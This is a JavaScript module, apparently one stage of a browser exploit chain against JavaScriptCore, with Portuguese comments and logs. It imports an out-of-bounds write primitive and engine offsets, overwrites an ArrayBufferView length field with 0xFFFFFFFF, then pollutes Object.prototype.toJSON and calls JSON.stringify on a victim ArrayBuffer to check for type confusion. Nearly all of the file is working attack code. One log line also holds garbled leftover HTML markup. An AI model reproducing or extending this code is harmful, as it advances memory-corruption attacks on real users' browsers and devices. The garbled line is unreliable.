// js/script3/testMinimalTCReplication.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// A constante é exportada como FNAME_MODULE_V32
export const FNAME_MODULE_V32 = "MinimalTCReplication_v32"; 

const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF; 
const VICTIM_AB_SIZE = 64;

let tc_replication_results_v32 = null;

function toJSON_MinimalTypeCheck_v32() {
    tc_replication_results_v32 = {
        toJSON_executed: "toJSON_MinimalTypeCheck_v32",
        this_actual_type: "N/A",
        error_in_toJSON: null
    };
    try {
        tc_replication_results_v32.this_actual_type = Object.prototype.toString.call(this);
    } catch (e) {
        tc_replication_results_v32.error_in_toJSON = `${e.name}: ${e.message}`;
    }
    return tc_replication_results_v32; 
}

// A função exportada foi executeMinimalTCReplicationTest_v31 na sua solicitação anterior,
// mas o módulo é v32. Vou manter o nome da função como _v32 para consistência interna.
export async function executeMinimalTCReplicationTest_v32() { 
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V32}.replicateTC`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Tentando Replicar Type Confusion de v26 ---`, "test", FNAME_CURRENT_TEST);
    document.title = `ReplicateTC_v32`;

    tc_replication_results_v32 = null;
    let errorCapturedMain = null;
    let stringifyOutput = null;
    let potentiallyCrashed = true; 
    let lastStep = "init";

    const mLengthOffsetFromConfig = parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);
    if (isNaN(mLengthOffsetFromConfig)) {
        logS3("ERRO CRÍTICO: JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET não é um número válido.", "critical", FNAME_CURRENT_TEST);
        return { errorOccurred: new Error("Invalid M_LENGTH_OFFSET"), potentiallyCrashed: false, stringifyResult: null, toJSON_details: null };
    }
    const FAKE_VIEW_BASE_OFFSET_FOR_CALC = 0x58; 
    const corruptionTargetOffsetInOOBAB = FAKE_VIEW_BASE_OFFSET_FOR_CALC + mLengthOffsetFromConfig; 

    try {
        lastStep = "oob_setup";
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`   Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(corruptionTargetOffsetInOOBAB)}`, "info", FNAME_CURRENT_TEST);

        lastStep = "critical_oob_write";
        logS3(`PASSO 1: Escrevendo valor CRÍTICO <span class="math-inline">\{toHex\(CRITICAL\_OOB\_WRITE\_VALUE\)\} em oob\_array\_buffer\_real\[</span>{toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST);

        await PAUSE_S3(100);

        lastStep = "victim_creation_and_stringify";
        let victim_ab = new ArrayBuffer(VICTIM_AB_SIZE);
        logS3(`PASSO 2: victim_ab (${VICTIM_AB_SIZE} bytes) criado. Tentando JSON.stringify(victim_ab) com ${toJSON_MinimalTypeCheck_v32.name}...`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_MinimalTypeCheck_v32,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab); 
            potentiallyCrashed = false; 

            logS3(`  JSON.stringify(victim_ab) completou. Resultado da toJSON: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (stringifyOutput && stringifyOutput.error_in_toJSON) {
                logS3(`    ERRO DENTRO da toJSON: ${stringifyOutput.error_in_toJSON}`, "error", FNAME_CURRENT_TEST);
                errorCapturedMain = new Error(stringifyOutput.error_in_toJSON);
            }
            if (stringifyOutput && stringifyOutput.this_actual_type === "[object Object]") {
                logS3("    !!!! TYPE CONFUSION REPLICADA !!!! 'this' na toJSON (de victim_ab) é [object Object]!", "critical", FNAME_CURRENT_TEST);
                document.title = `TC REPLICATED (v32): ${stringifyOutput.this_actual_type}`;
            } else if (stringifyOutput && stringifyOutput.this_actual_type) {
                 logS3(`    INFO: 'this' na toJSON é ${stringifyOutput.this_actual_type}. TC para [object Object] não ocorreu.`, "info", FNAME_CURRENT_TEST);
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            potentiallyCrashed = false; 
            lastStep = "error_in_stringify";
            logS3(`   ERRO CRÍTICO durante JSON.stringify(victim_ab): ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_TEST);
            document.title = `ReplicateTC_v32 CRASH: ${e_str.name}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        potentiallyCrashed = false; 
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V32} FALHOU: ${e_outer_main.name}`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} (Último passo: ${lastStep}) Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed, 
        stringifyResult: stringifyOutput, 
        toJSON_details: tc_replication_results_v32 
    };
}
